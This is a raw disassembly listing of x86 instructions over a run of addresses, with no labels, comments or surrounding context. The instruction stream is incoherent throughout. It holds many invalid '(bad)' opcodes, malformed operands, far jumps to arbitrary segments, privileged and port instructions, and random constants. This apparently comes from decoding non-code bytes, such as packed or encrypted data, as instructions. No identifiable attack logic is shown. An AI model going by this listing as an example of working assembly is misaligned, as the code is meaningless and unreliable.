  424d6d:	and    al,BYTE PTR [esi-0xb50d3e8]
  424d73:	and    al,0xbc
  424d75:	mov    al,BYTE PTR [ebx]
  424d77:	push   0xffffffa2
  424d79:	cmp    eax,esp
  424d7b:	scas   al,BYTE PTR es:[edi]
  424d7c:	inc    ebp
  424d7d:	push   ebx
  424d7e:	rol    DWORD PTR [eax],1
  424d80:	repz sbb edx,DWORD PTR [ecx*8-0x5b741ebe]
  424d88:	loopne 0x424de6
  424d8a:	scas   eax,DWORD PTR es:[edi]
  424d8b:	sub    eax,0xcc64b1f0
  424d90:	inc    ebx
  424d91:	sbb    BYTE PTR [edx+0xc],ch
  424d94:	lea    ebx,ds:0x83824795
  424d9a:	clc    
  424d9b:	and    cl,BYTE PTR [ebp+0x39]
  424d9e:	(bad)  
  424d9f:	jmp    edi
  424da1:	imul   edi,DWORD PTR [eax-0x47],0x1e
  424da5:	fs cli 
  424da7:	fild   WORD PTR [edx-0x65319d6a]
  424dad:	outs   dx,BYTE PTR ds:[esi]
  424dae:	fs lahf 
  424db0:	gs sub ebp,esi
  424db3:	arpl   WORD PTR [ecx],si
  424db5:	sbb    BYTE PTR [edi],ch
  424db7:	push   ecx
  424db8:	imul   ecx,DWORD PTR [ebx],0xa80e9d9
  424dbe:	stos   DWORD PTR es:[edi],eax
  424dbf:	pop    ds
  424dc0:	adc    al,BYTE PTR [ebx]
  424dc2:	inc    eax
  424dc3:	jmp    0x4341:0x64ff85d8
  424dca:	adc    DWORD PTR [ecx],edi
  424dcc:	shl    ebx,cl
  424dce:	daa    
  424dcf:	inc    ecx
  424dd0:	sahf   
  424dd1:	adc    al,0x87
  424dd3:	xchg   ebx,eax
  424dd4:	add    bh,bh
  424dd6:	ret    
  424dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dd8:	in     al,0x8c
  424dda:	je     0x424e2b
  424ddc:	adc    DWORD PTR [ecx+0x1b8c69e7],ecx
  424de2:	mov    dl,0xcf
  424de4:	pushf  
  424de5:	xor    al,0x94
  424de7:	bound  ebx,QWORD PTR [esi]
  424de9:	out    dx,al
  424dea:	adc    BYTE PTR [ebp-0x79],0xba
  424dee:	lds    ebp,FWORD PTR [ebx]
  424df0:	(bad)  
  424df1:	jmp    0x424df2
  424df3:	add    eax,0x15317eea
  424df8:	sbb    bh,BYTE PTR [ebx-0x2268bf8b]
  424dfe:	xlat   BYTE PTR ds:[ebx]
  424dff:	scas   eax,DWORD PTR es:[edi]
  424e00:	xchg   esp,eax
  424e01:	inc    esi
  424e02:	nop
  424e03:	lds    esp,FWORD PTR [ecx+0x35]
  424e06:	dec    edx
  424e07:	jmp    0x15efcabf
  424e0c:	fld    QWORD PTR [ebp+0x19]
  424e0f:	lock in al,0x0
	...
  424e72:	add    BYTE PTR [eax],al
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e27
  424e81:	inc    esi
  424e82:	xchg   ebp,eax
  424e83:	stos   DWORD PTR es:[edi],eax
  424e84:	mov    al,BYTE PTR gs:[ecx]
  424e87:	add    BYTE PTR ds:0xda000001,al
  424e8d:	loope  0x424e8c
  424e8f:	dec    esi
  424e90:	stos   DWORD PTR es:[edi],eax
  424e91:	add    ah,BYTE PTR [di]
  424e94:	aas    
  424e95:	fs aam 0xe
  424e98:	inc    ecx
  424e99:	mov    ebp,0x238b7050
  424e9e:	cmp    cl,dh
  424ea0:	lods   al,BYTE PTR ds:[esi]
  424ea1:	inc    esi
  424ea2:	test   al,0x2
  424ea4:	and    al,0x37
  424ea6:	movsx  eax,WORD PTR [ebx]
  424ea9:	ins    DWORD PTR es:[edi],dx
  424eaa:	xchg   BYTE PTR [eax+0x6b],bl
  424ead:	xchg   ecx,eax
  424eae:	lahf   
  424eaf:	(bad)  
  424eb0:	ins    DWORD PTR es:[edi],dx
  424eb1:	xchg   BYTE PTR [esi+0x71],ah
  424eb4:	dec    ebp
  424eb5:	call   DWORD PTR [ecx+0x35]
  424eb8:	outs   dx,DWORD PTR ds:[esi]
  424eb9:	mov    DWORD PTR [eax],eax
  424ebb:	jb     0x424e9e
  424ebd:	dec    ebx
  424ebe:	pop    esi
  424ebf:	cmp    esp,DWORD PTR [ebx-0x4af9506b]
  424ec5:	cwde   
  424ec6:	adc    DWORD PTR [ebp+0x2f],ebp
  424ec9:	xor    BYTE PTR [eax],al
  424ecb:	scas   eax,DWORD PTR es:[edi]
  424ecc:	std    
  424ecd:	and    eax,0x6512e48c
  424ed2:	(bad)  
  424ed3:	jmp    0x424ee8
  424ed5:	xchg   BYTE PTR [esp+eiz*8+0x12],al
  424ed9:	or     ebx,DWORD PTR [esi]
  424edb:	mov    cs,WORD PTR [ebp-0x769aefd1]
  424ee1:	xor    bl,cl
  424ee3:	inc    edx
  424ee4:	mov    ah,0x6a
  424ee6:	mov    ds:0xd1fd3473,eax
  424eeb:	sbb    cl,ah
  424eed:	pop    DWORD PTR [esi+eax*1+0x50869bcd]
  424ef4:	jnp    0x424f58
  424ef6:	ja     0x424eb0
  424ef8:	mov    ds:0x337e7bfa,eax
  424efd:	arpl   WORD PTR [ebp+0x16],dx
  424f00:	scas   al,BYTE PTR es:[edi]
  424f01:	nop
  424f02:	into   
  424f03:	sar    BYTE PTR [esi],cl
  424f05:	pushf  
  424f06:	dec    ebp
  424f07:	mov    ds:0xf2562c65,eax
  424f0c:	pop    eax
  424f0d:	jge    0x424eb6
  424f0f:	mov    ebx,0x66230721
  424f14:	jle    0x424f65
  424f16:	adc    esp,esi
  424f18:	and    eax,edx
  424f1a:	inc    esp
  424f1b:	add    al,0x56
  424f1d:	mov    dl,0x3c
  424f1f:	sbb    DWORD PTR [edx-0x2e],edx
  424f22:	cli    
  424f23:	cmp    eax,0xa6a58e2f
  424f28:	mov    ecx,ds
  424f2a:	(bad)  
  424f2b:	adc    eax,0x43d7e1d2
  424f30:	out    0x85,eax
  424f32:	cmpps  xmm7,XMMWORD PTR [ebp+0x68],0x57
  424f37:	pusha  
  424f38:	in     eax,0xf2
  424f3a:	retf   
  424f3b:	(bad)  
  424f3c:	in     eax,0x62
  424f3e:	jle    0x424fa4
  424f40:	adc    eax,0xd200db1f
  424f45:	jmp    0xeb20:0x72cea64
  424f4c:	pop    ebp
  424f4d:	xor    cl,bl
  424f4f:	ss mov ebp,0xe5f665d6
  424f55:	ret    
  424f56:	outs   dx,DWORD PTR ds:[esi]
  424f57:	call   0xdb2d:0xae5d7003
  424f5e:	dec    esp
  424f5f:	sbb    ah,BYTE PTR [ebx-0x5e]
  424f62:	xchg   esi,eax
  424f63:	mov    eax,ds:0x7392ab69
  424f68:	pop    edx
  424f69:	sbb    BYTE PTR [edx],cl
  424f6b:	in     eax,0xbd
  424f6d:	stc    
  424f6e:	repz mov ch,bh
  424f71:	ds cs pusha 
  424f74:	mov    eax,ds:0xaac9a9b1
  424f79:	xor    DWORD PTR [ebx+0x1],esp
  424f7c:	xor    edi,0x7112dd97
  424f82:	dec    ebp
  424f83:	popf   
  424f84:	push   es
  424f85:	(bad)  
  424f86:	addr16 inc dl
  424f89:	fadd   DWORD PTR [ebx-0x3c]
  424f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f8d:	add    al,bh
  424f8f:	add    DWORD PTR [edx],0x0
	...
  424ff1:	add    BYTE PTR [eax],al
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	lea    edi,[edi+0x37]
  425003:	jns    0x42506f
  425005:	mov    eax,DWORD PTR [ecx]
  425007:	add    BYTE PTR ds:0x7b000001,al
  42500d:	retf   
  42500e:	inc    edx
  42500f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425010:	(bad)
  425014:	test   ebp,ebp
  425016:	ret    0x83d
  425019:	add    al,0xed
  42501b:	inc    edi
  42501c:	sbb    BYTE PTR [ebx],dh
  42501e:	daa    
  42501f:	icebp  
  425020:	dec    edi
  425021:	and    eax,0x4723de57
  425026:	jno    0x424fbb
  425028:	ficomp DWORD PTR [ecx]
  42502a:	cs pop esp
  42502c:	je     0x424ffc
  42502e:	fist   WORD PTR [edi]
  425030:	push   esp
  425031:	daa    
  425032:	inc    ecx
  425033:	adc    esi,DWORD PTR [ecx]
  425035:	or     ah,0x6e
  425038:	cmp    eax,0x9e0965f9
  42503d:	or     DWORD PTR [ecx-0x63a4bc96],edi
  425043:	or     BYTE PTR [eax+edi*1-0x499e179],0xa6
  42504b:	dec    esp
  42504c:	(bad)  
  42504d:	nop
  42504e:	popf   
  42504f:	mov    dl,0xc6
  425051:	fadd   DWORD PTR [ebx]
  425053:	sub    eax,0xb77c0a11
  425058:	pop    edi
  425059:	sub    ch,BYTE PTR [esi]
  42505b:	dec    ecx
  42505c:	shl    ebx,cl
  42505e:	jnp    0x4250c3
  425060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425061:	jb     0x4250a3
  425063:	jg     0x425001
  425065:	sbb    DWORD PTR [ebx],edi
  425067:	adc    ebx,DWORD PTR [ebp-0xc]
  42506a:	xchg   esp,eax
  42506b:	inc    eax
  42506c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42506d:	xchg   edi,eax
  42506e:	and    BYTE PTR [ebp-0x1a],dl
  425071:	cdq    
  425072:	xlat   BYTE PTR ds:[ebx]
  425073:	loop   0x425063
  425075:	push   eax
  425076:	or     ecx,DWORD PTR [edx-0x2aca439a]
  42507c:	scas   al,BYTE PTR es:[edi]
  42507d:	popf   
  42507e:	repnz (bad) 
  425081:	push   eax
  425082:	and    DWORD PTR [edx],ecx
  425084:	cs (bad) 
  425086:	call   0x8df50e00
  42508b:	ins    DWORD PTR es:[edi],dx
  42508c:	les    ebx,FWORD PTR [edx+0x66]
  42508f:	push   ds
  425090:	pushf  
  425091:	sar    BYTE PTR [edi+0xf78d54a],0x39
  425098:	leave  
  425099:	enter  0xd331,0x36
  42509d:	mov    edi,0xc538fef8
  4250a2:	(bad)  
  4250a3:	mov    ebp,0xf71c617b
  4250a8:	cmp    cl,ah
  4250aa:	and    eax,0xe1567f9e
  4250af:	push   ss
  4250b0:	sbb    DWORD PTR [edx+0x6a860f92],edx
  4250b6:	push   eax
  4250b7:	mov    al,0x29
  4250b9:	push   esp
  4250ba:	(bad)  
  4250bb:	mov    cs,WORD PTR [ebx+0x4ab10ba6]
  4250c1:	add    al,0x71
  4250c3:	cmp    BYTE PTR [eax],dl
  4250c5:	dec    esp
  4250c6:	and    BYTE PTR [edx+0x3098e91d],bh
  4250cc:	or     eax,0x33da0555
  4250d1:	adc    BYTE PTR ss:[edi-0x2dcc4798],dl
  4250d8:	cwde   
  4250d9:	mov    eax,DWORD PTR [ecx+0x4d9487b3]
  4250df:	push   edi
  4250e0:	dec    ecx
  4250e1:	sub    DWORD PTR [ebx+0x7f],0x6b
  4250e5:	cld    
  4250e6:	scas   al,BYTE PTR es:[edi]
  4250e7:	outs   dx,BYTE PTR ds:[esi]
  4250e8:	imul   edx,DWORD PTR [ecx+0x3f],0x301f343
  4250ef:	mov    dh,BYTE PTR [ecx-0x2191a1c6]
  4250f5:	fldenv [ebp+edi*8-0x3197f0e]
  4250fc:	sar    BYTE PTR [ecx],0x6
  4250ff:	addr16 retf 
  425101:	xchg   dh,al
  425103:	sbb    BYTE PTR [edi-0x4e],cl
  425106:	or     al,0x1a
  425108:	aad    0x21
  42510a:	adc    BYTE PTR [edx+0x2b2eea42],dl
  425110:	std    
	...
  425171:	add    BYTE PTR [eax],al
  425173:	add    dh,bl
  425175:	adc    DWORD PTR [edi-0x15020dd],ebx
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0xaa08:0x68e892e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0xa4000001,al
  42518d:	je     0x42511a
  42518f:	iret   
  425190:	pop    ebp
  425191:	add    al,BYTE PTR [ebx+0x50]
  425194:	les    ebp,FWORD PTR [eax]
  425196:	std    
  425197:	jecxz  0x425215
  425199:	cmp    bl,cl
  42519b:	pop    esp
  42519c:	jmp    0x9664:0x6bfc2f92
  4251a3:	scas   al,BYTE PTR es:[edi]
  4251a4:	add    ebx,edi
  4251a6:	jg     0x4251fe
  4251a8:	fwait
  4251a9:	jge    0x42512d
  4251ab:	push   es
  4251ac:	mul    BYTE PTR [ecx-0x67]
  4251af:	mov    ?,ecx
  4251b1:	xchg   edi,eax
  4251b2:	out    dx,eax
  4251b3:	out    dx,al
  4251b4:	jg     0x425188
  4251b6:	stos   BYTE PTR es:[edi],al
  4251b7:	and    edx,eax
  4251b9:	rcr    DWORD PTR [ebx+edx*1],0x4
  4251bd:	add    DWORD PTR [edi+0x2e],eax
  4251c0:	add    eax,0x95cbcef8
  4251c5:	dec    esi
  4251c6:	dec    ecx
  4251c7:	jge    0x425170
  4251c9:	inc    edi
  4251ca:	pop    ds
  4251cb:	enter  0x12a6,0xf6
  4251cf:	shl    BYTE PTR [ecx-0x43581179],cl
  4251d5:	(bad)  
  4251d6:	ins    BYTE PTR es:[edi],dx
  4251d7:	jp     0x425212
  4251d9:	pop    ecx
  4251da:	js     0x4251b0
  4251dc:	pop    edi
  4251dd:	mov    ds:0xb5bea550,al
  4251e2:	imul   eax,DWORD PTR [ebp+edi*8+0x52],0x764fe461
  4251ea:	push   cs
  4251eb:	push   ebp
  4251ec:	dec    ebx
  4251ed:	popa   
  4251ee:	pop    ebp
  4251ef:	xor    eax,0x3f993e88
  4251f4:	(bad)  
  4251f5:	leave  
  4251f6:	mov    al,BYTE PTR [edx-0x42a58a2b]
  4251fc:	xchg   esi,eax
  4251fd:	or     DWORD PTR [esi],esp
  4251ff:	aam    0xf8
  425201:	push   ebp
  425202:	mov    dl,0xe2
  425204:	mov    ebx,0xf2491abb
  425209:	inc    edi
  42520a:	call   0xf813:0x76502341
  425211:	mov    ds:0xd2533507,al
  425216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425217:	jb     0x425244
  425219:	icebp  
  42521a:	(bad)  
  42521b:	and    al,0x96
  42521d:	jl     0x42520f
  42521f:	fld    st(3)
  425221:	repz dec edi
  425223:	or     eax,0xc3c07b76
  425228:	inc    ebp
  425229:	outs   dx,DWORD PTR ds:[esi]
  42522a:	int3   
  42522b:	sub    edx,edi
  42522d:	fwait
  42522e:	push   ds
  42522f:	mov    al,0x9b
  425231:	or     ch,BYTE PTR [ecx]
  425233:	jge    0x425273
  425235:	or     esi,ebp
  425237:	push   ebx
  425238:	and    eax,edi
  42523a:	dec    esi
  42523b:	adc    DWORD PTR [ecx+0x3c],edi
  42523e:	dec    eax
  42523f:	xchg   BYTE PTR [ebx-0x6027e53],ah
  425245:	mov    ch,0xb9
  425247:	and    cl,dl
  425249:	or     BYTE PTR [edx],dh
  42524b:	int    0x2a
  42524d:	dec    ebp
  42524e:	sub    DWORD PTR [ebx-0x817af78],ebp
  425254:	push   esi
  425255:	sub    dh,dh
  425257:	mov    ecx,0xdc968db2
  42525c:	mov    bh,0x8b
  42525e:	mov    esp,0xe8026cee
  425263:	dec    DWORD PTR [edi+eiz*2]
  425266:	jmp    0xd46392e8
  42526b:	pop    esi
  42526c:	or     dh,ch
  42526e:	ins    BYTE PTR es:[edi],dx
  42526f:	scas   al,BYTE PTR es:[edi]
  425270:	aad    0x97
  425272:	outs   dx,DWORD PTR ds:[esi]
  425273:	mov    al,0xe
  425275:	adc    ch,BYTE PTR ds:0x6759633a
  42527b:	outs   dx,BYTE PTR ds:[esi]
  42527c:	mov    dh,0xb2
  42527e:	jg     0x4252db
  425280:	xchg   DWORD PTR [esp+ebx*8],ecx
  425283:	sub    ebp,DWORD PTR [eiz*8+0x342386b1]
  42528a:	mov    edx,0x8ab67ba4
  42528f:	cmp    al,0xdd
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	add    cl,BYTE PTR [ebp-0x73]
  425303:	test   eax,0x18d74
  425308:	add    eax,0x35000001
  42530d:	pop    edi
  42530e:	imul   ecx,esp,0x9
  425311:	mov    ch,0x15
  425313:	(bad)  
  425314:	push   eax
  425315:	jb     0x4252f7
  425317:	popf   
  425318:	mov    ds:0xf44fd716,al
  42531d:	mov    ebp,0x7e3c0462
  425322:	jns    0x42539f
  425324:	dec    eax
  425325:	jmp    0x42531c
  425327:	mov    ds:0x37f96db3,al
  42532c:	xchg   dh,dh
  42532e:	retf   
  42532f:	shr    dl,1
  425331:	gs scas al,BYTE PTR es:[edi]
  425333:	xchg   al,cl
  425335:	pop    eax
  425336:	(bad)  
  425337:	mov    eax,ds:0xa8d617a7
  42533c:	lahf   
  42533d:	push   ss
  42533e:	test   al,0x34
  425340:	adc    DWORD PTR [eax-0x38],0x21
  425344:	popf   
  425345:	mov    al,ds:0xb35eb86c
  42534a:	cmp    dh,BYTE PTR [edi+0x42]
  42534d:	adc    edx,edx
  42534f:	cld    
  425350:	sti    
  425351:	push   es
  425352:	ds mov cl,0x77
  425355:	aam    0x30
  425357:	mov    gs,eax
  425359:	(bad)  [ebx+0x35]
  42535c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42535d:	mov    bl,0x9c
  42535f:	fwait
  425360:	dec    esp
  425361:	adc    BYTE PTR [ecx],al
  425363:	pushf  
  425364:	adc    DWORD PTR [edx],ebx
  425366:	mov    WORD PTR [edx+0x24],cs
  425369:	mov    ebx,0x3968b23d
  42536e:	xchg   esi,eax
  42536f:	hlt    
  425370:	mov    ah,0x12
  425372:	mov    esi,0x7edbdc1e
  425377:	mov    cl,0xd7
  425379:	retf   0x3c06
  42537c:	retf   
  42537d:	push   ss
  42537e:	pop    esp
  42537f:	push   ebx
  425380:	stos   DWORD PTR es:[edi],eax
  425381:	(bad)  
  425382:	push   0xfffffff3
  425384:	(bad)  
  425385:	push   esi
  425386:	dec    edx
  425387:	cmp    al,0x8c
  425389:	jg     0x42532b
  42538b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42538c:	pop    edi
  42538d:	and    ebp,esi
  42538f:	xor    edi,edi
  425391:	aad    0x72
  425393:	out    dx,al
  425394:	loop   0x4253e5
  425396:	and    bl,cl
  425398:	ins    BYTE PTR es:[edi],dx
  425399:	sti    
  42539a:	test   eax,0x4fa7b4a0
  42539f:	push   eax
  4253a0:	xor    ebp,DWORD PTR [ebp-0x5356e258]
  4253a6:	ret    
  4253a7:	pop    eax
  4253a8:	(bad)  
  4253a9:	frstor [ecx]
  4253ab:	and    al,0x8a
  4253ad:	mov    ch,0x66
  4253af:	aas    
  4253b0:	and    al,ch
  4253b2:	sub    al,0x67
  4253b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253b5:	or     eax,0xd14ddb97
  4253ba:	inc    edx
  4253bb:	jg     0x4253db
  4253bd:	sub    eax,0x7c58af57
  4253c2:	jne    0x425434
  4253c4:	pop    esi
  4253c5:	mov    al,ds:0x40449a29
  4253ca:	fidiv  DWORD PTR [ebp+0x4e8caf52]
  4253d0:	or     esi,ecx
  4253d2:	fstp   QWORD PTR [esi+0x0]
  4253d5:	clc    
  4253d6:	dec    eax
  4253d7:	out    0x6a,al
  4253d9:	outs   dx,BYTE PTR ds:[esi]
  4253da:	fistp  WORD PTR cs:[edx+eiz*1+0xd]
  4253df:	sbb    DWORD PTR [edx-0x442b26a5],esi
  4253e5:	sbb    al,ah
  4253e7:	stos   DWORD PTR es:[edi],eax
  4253e8:	inc    esi
  4253e9:	(bad)  [ebx+0x61bcb54c]
  4253ef:	xchg   esi,eax
  4253f0:	ss out 0xfd,al
  4253f3:	sti    
  4253f4:	jecxz  0x4253af
  4253f6:	pusha  
  4253f7:	xchg   ebx,eax
  4253f8:	dec    ebx
  4253f9:	inc    ecx
  4253fa:	mov    ah,BYTE PTR [edi+0xc44848c]
  425400:	int3   
  425401:	aam    0x83
  425403:	or     esi,edx
  425405:	push   es
  425406:	inc    edi
  425407:	push   esi
  425408:	in     eax,0x8b
  42540a:	and    BYTE PTR [edx*2-0xfe40acd],ah
	...
  425471:	add    BYTE PTR [eax],al
  425473:	add    BYTE PTR [edx+0x9],al
  425476:	les    ebp,FWORD PTR [ecx-0x14901231]
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebp,DWORD PTR [esi+0x7914dac7]
  425485:	mov    es,WORD PTR [ecx]
  425487:	add    BYTE PTR ds:0x5d000001,al
  42548d:	add    dl,ah
  42548f:	inc    ecx
  425490:	mov    dh,0x49
  425492:	ficomp DWORD PTR [edx-0x77]
  425495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425496:	and    bh,BYTE PTR [eax-0x64]
  425499:	out    dx,al
  42549a:	push   edx
  42549b:	mov    bl,0xa3
  42549d:	mov    ?,WORD PTR [esi+0x4]
  4254a0:	aas    
  4254a1:	inc    ebx
  4254a2:	sbb    eax,0xb727e061
  4254a7:	aad    0x8c
  4254a9:	loop   0x425444
  4254ab:	outs   dx,BYTE PTR ds:[esi]
  4254ac:	jle    0x4254cb
  4254ae:	nop
  4254af:	add    BYTE PTR [ebx+0x0],al
  4254b2:	es push edx
  4254b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254b5:	lea    edi,[edx-0x604e3ab2]
  4254bb:	dec    edi
  4254bc:	cmc    
  4254bd:	out    0x91,eax
  4254bf:	add    al,0x56
  4254c1:	pop    edx
  4254c2:	in     al,0x31
  4254c4:	and    BYTE PTR [esi-0x68],dl
  4254c7:	add    eax,0x7dadc327
  4254cc:	dec    ebp
  4254cd:	xchg   edx,eax
  4254ce:	mov    ch,0x38
  4254d0:	mov    DWORD PTR [esi-0x1e],ebx
  4254d3:	fld    TBYTE PTR [eax-0x6520018c]
  4254d9:	sub    BYTE PTR [edx-0x462df1d8],bh
  4254df:	inc    esp
  4254e0:	or     BYTE PTR [edx-0x5ffc7b7f],dh
  4254e6:	je     0x4254ac
  4254e8:	fldcw  WORD PTR [ecx+eiz*1-0x65c7b8f3]
  4254ef:	int    0x60
  4254f1:	outs   dx,BYTE PTR ds:[esi]
  4254f2:	scas   al,BYTE PTR es:[edi]
  4254f3:	fisttp WORD PTR [ecx-0x60]
  4254f6:	cli    
  4254f7:	dec    ebp
  4254f8:	fcomp  DWORD PTR [edi-0x13]
  4254fb:	stos   BYTE PTR es:[edi],al
  4254fc:	sub    dh,BYTE PTR [ecx-0xa577e47]
  425502:	mov    WORD PTR [ebx-0x6de9e8c0],ds
  425508:	sub    ebx,DWORD PTR ds:0xa25fc0f3
  42550e:	cli    
  42550f:	rcr    BYTE PTR [ebx],0x73
  425512:	inc    esp
  425513:	inc    ebx
  425514:	imul   edx,DWORD PTR [ecx+0x60a8d6d],0xf83690c6
  42551e:	jno    0x425524
  425520:	pop    ebp
  425521:	ins    BYTE PTR es:[edi],dx
  425522:	(bad)  
  425523:	es cmp eax,0xe621024e
  425529:	clc    
  42552a:	div    BYTE PTR [ecx+ecx*2-0x10cb2abd]
  425531:	pop    ebx
  425532:	cmp    eax,0x9f1fd728
  425537:	popa   
  425538:	clc    
  425539:	xchg   edi,eax
  42553a:	fadd   QWORD PTR [ebp+0x632965bc]
  425540:	das    
  425541:	out    0x9,eax
  425543:	stc    
  425544:	(bad)  
  425545:	xor    ebp,0x3be0175d
  42554b:	repz fbstp TBYTE PTR [ecx+0x67ea6f7c]
  425552:	hlt    
  425553:	sub    ah,BYTE PTR [eax+eax*4-0x2]
  425557:	jno    0x425562
  425559:	aam    0xbe
  42555b:	rcr    DWORD PTR [ebp+0x5d537745],0x43
  425562:	mov    eax,0x756c50d0
  425567:	(bad)  
  425568:	div    eax
  42556a:	mov    WORD PTR [ecx],gs
  42556c:	das    
  42556d:	adc    eax,0x208ed22
  425572:	xor    BYTE PTR [eax+0x2e],bl
  425575:	jmp    0x6be8d6a0
  42557a:	sbb    eax,0x95fac930
  42557f:	xor    DWORD PTR [ebx-0x4b047876],ebp
  425585:	pop    ecx
  425586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425587:	jno    0x42559e
  425589:	pop    es
  42558a:	and    dl,BYTE PTR [edx+eiz*2+0x28d424b7]
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xc3aff13a
  425602:	out    dx,al
  425603:	(bad)  
  425604:	jle    0x425595
  425606:	add    DWORD PTR [eax],eax
  425608:	add    eax,0x26000001
  42560d:	ret    
  42560e:	ror    DWORD PTR [eax-0x3f],cl
  425611:	mov    esi,0x4ea6fb08
  425616:	ret    
  425617:	mov    ecx,?
  425619:	nop
  42561a:	icebp  
  42561b:	dec    edx
  42561c:	cdq    
  42561d:	mov    dl,0xdd
  42561f:	jae    0x42568f
  425621:	fadd   DWORD PTR [ebp+0x29]
  425624:	sti    
  425625:	js     0x4255da
  425627:	inc    esp
  425628:	ins    DWORD PTR es:[edi],dx
  425629:	imul   eax,edi,0x4a0d61ed
  42562f:	fucomip st,st(5)
  425631:	in     al,0x12
  425633:	xchg   edi,eax
  425634:	into   
  425635:	mov    dl,0xc
  425637:	cmc    
  425638:	add    BYTE PTR [eax+0x6],0xe4
  42563c:	add    al,0x10
  42563e:	test   BYTE PTR [edx],bh
  425640:	pop    edi
  425641:	mov    BYTE PTR [ecx],ah
  425643:	push   0x41
  425645:	idiv   ecx
  425647:	das    
  425648:	mov    ebx,0xc4eba88e
  42564d:	jb     0x42569d
  42564f:	xor    eax,0xdd46e74a
  425654:	bound  ecx,QWORD PTR [ebx+0x8]
  425657:	int3   
  425658:	pop    esi
  425659:	add    DWORD PTR ds:0xa24afff8,eax
  42565f:	mov    dh,0x42
  425661:	sbb    DWORD PTR [esi],eax
  425663:	popa   
  425664:	test   al,0x79
  425666:	sbb    ebx,DWORD PTR [edx+0x70]
  425669:	xor    BYTE PTR [ebp+0x23],0xf7
  42566d:	sbb    bh,BYTE PTR [edi]
  42566f:	stc    
  425670:	and    eax,DWORD PTR [esi-0x31]
  425673:	push   edx
  425674:	mov    ds:0xc8b80cd5,eax
  425679:	xor    al,0x8
  42567b:	or     ebp,DWORD PTR [ebx+0x26]
  42567e:	or     DWORD PTR [esi],ebp
  425680:	push   0x2f
  425682:	push   ebp
  425683:	push   edi
  425684:	lods   eax,DWORD PTR ds:[esi]
  425685:	fnop   
  425687:	call   0x90331099
  42568c:	jb     0x42566b
  42568e:	int    0xc3
  425690:	cs mov bl,0xed
  425693:	add    ebx,ebx
  425695:	loopne 0x4256b5
  425697:	fwait
  425698:	retf   0xa2d1
  42569b:	push   edi
  42569c:	add    DWORD PTR [ecx],edi
  42569e:	adc    BYTE PTR [ebx],0x50
  4256a1:	adc    eax,0xf1f7be97
  4256a6:	xor    ecx,eax
  4256a8:	add    eax,0x42465ee7
  4256ad:	popf   
  4256ae:	sub    DWORD PTR [ecx],esi
  4256b0:	out    0xf1,eax
  4256b2:	mov    dh,0xc5
  4256b4:	lock jp 0x425668
  4256b7:	pop    edx
  4256b8:	shl    DWORD PTR [edx+0x7b],cl
  4256bb:	jl     0x4256cf
  4256bd:	(bad)  
  4256be:	and    cl,bh
  4256c0:	repnz outs dx,BYTE PTR ds:[esi]
  4256c2:	je     0x425665
  4256c4:	mov    ebx,0x4077e429
  4256c9:	jge    0x425713
  4256cb:	sbb    dh,BYTE PTR [esi+esi*8+0x1c]
  4256cf:	ror    BYTE PTR [ecx+0x47e1e7b6],cl
  4256d5:	iret   
  4256d6:	rcr    esi,1
  4256d8:	jbe    0x425697
  4256da:	add    dh,cl
  4256dc:	push   esp
  4256dd:	mov    ss,WORD PTR [edx+0x4b]
  4256e0:	xchg   edi,eax
  4256e1:	inc    ebx
  4256e2:	dec    ecx
  4256e3:	sbb    al,0xcb
  4256e5:	loop   0x4256f1
  4256e7:	loopne 0x4256a2
  4256e9:	sbb    dh,BYTE PTR [ebp-0x6e]
  4256ec:	add    eax,0x548aaf3a
  4256f1:	push   cs
  4256f2:	pop    esi
  4256f3:	hlt    
  4256f4:	fsubr  st,st(4)
  4256f6:	pop    edx
  4256f7:	adc    al,0x25
  4256f9:	inc    ecx
  4256fa:	pop    ss
  4256fb:	sub    esi,ebp
  4256fd:	pop    ss
  4256fe:	sub    ebx,DWORD PTR [edi+ebp*1+0x2d]
  425702:	out    0x88,al
  425704:	outs   dx,BYTE PTR ds:[esi]
  425705:	or     eax,0x646681ec
  42570a:	mov    al,ah
  42570c:	pop    ss
  42570d:	and    esp,DWORD PTR [esi+0x52d2]
	...
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x9b755f74
  425783:	xor    eax,0x19083
  425788:	add    eax,0x69000001
  42578d:	cmp    esp,DWORD PTR [ecx]
  42578f:	or     al,0xff
  425791:	into   
  425792:	sbb    ebp,DWORD PTR [esi-0x1e2a8f09]
  425798:	jmp    0x2ed1c7da
  42579d:	inc    ecx
  42579e:	pushf  
  42579f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257a0:	inc    ecx
  4257a1:	dec    edi
  4257a2:	(bad)  
  4257a3:	jl     0x42578c
  4257a5:	xor    edx,DWORD PTR [eax+0x29]
